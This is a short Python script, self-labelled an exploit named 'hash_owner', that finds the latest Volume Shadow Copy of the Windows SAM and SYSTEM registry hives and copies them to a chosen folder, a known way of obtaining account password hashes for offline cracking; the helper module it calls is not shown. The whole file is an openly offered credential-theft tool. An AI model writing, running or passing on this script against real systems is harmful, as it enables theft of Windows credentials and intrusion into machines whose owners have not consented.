# -*- coding:utf-8 -*-
import argparse
import vss_functions


def argument_parsing():
    parser = argparse.ArgumentParser(description=u'hash_owner v0.010 - exploit for copying SYSTEM and SAM files '
                                                 u'from Shadow Copy',
                                     epilog='made by Alexey Shcherbakov, 2016')

    parser.add_argument(action='store',
                        type=str,
                        dest='output_path',
                        help='Specify output path')

    return parser.parse_args()


if __name__ == '__main__':

    args = argument_parsing()
    sam_path = r'C:\Windows\System32\config\SAM'
    system_path = r'C:\Windows\System32\config\SYSTEM'

    vss_functions.copy_shadow_as_file(
        shadow_path=vss_functions.get_last_shadow_path(
            vss_functions.get_shadow_paths(sam_path)),
        output='{}\{}'.format(args.output_path, 'sam')
    )
    vss_functions.copy_shadow_as_file(
        shadow_path=vss_functions.get_last_shadow_path(
            vss_functions.get_shadow_paths(system_path)),
        output='{}\{}'.format(args.output_path, 'system')
    )
    print('Success!')
